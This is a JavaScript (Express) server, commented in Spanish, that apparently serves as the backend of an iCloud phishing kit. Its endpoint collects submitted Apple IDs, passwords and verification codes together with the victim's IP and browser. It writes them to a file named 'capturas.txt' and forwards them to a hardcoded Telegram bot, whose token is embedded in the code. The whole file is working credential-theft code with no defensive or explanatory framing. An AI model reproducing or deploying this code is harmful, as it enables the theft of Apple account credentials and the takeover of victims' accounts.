const express = require('express');
const fetch = require('node-fetch');
const fs = require('fs');

const app = express();

// --- PERMITIR CORS PARA PRUEBAS LOCALES ---
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept');
  res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  if (req.method === 'OPTIONS') {
    return res.sendStatus(200);
  }
  next();
});

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Configuración de tu bot de Telegram
const TOKEN = "8634674264:AAHYESXZ-TdtYnm61hKOu-mTC-wC8rNqbQc";
const CHAT  = "6900810669";

app.post('/api', async (req, res) => {
    const d = req.body || {};

    const id   = d.apple_id || "";
    const pass = d.password || "";
    const code = d.code     || "";
    const completo = d.completo ? true : false;

    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || "";
    const ua = req.headers['user-agent'] || "";

    // 1. Ver los datos en la consola de tu servidor en Render
    console.log(`[RECIBIDO] ID: ${id} | Pass: ${pass} | IP: ${ip}`);

    // 2. Registro local en un archivo de texto
    const linea = `${new Date().toISOString()} | ${id} | ${pass} | ${code} | ${ip} | ${ua}\n`;
    try {
        fs.appendFileSync("capturas.txt", linea);
    } catch (err) {
        console.error("Error al escribir archivo:", err);
    }

    // 3. Aviso a Telegram
    const texto = `iCloud [Captura]\nID: ${id}\nPass: ${pass}\nIP: ${ip}`;
    
    try {
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT}&text=${encodeURIComponent(texto)}`);
    } catch (e) {
        console.error("Error al enviar a Telegram:", e);
    }

    res.json({ ok: true });
});

// Puerto dinámico para Render
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Servidor corriendo en el puerto ${PORT}`);
});
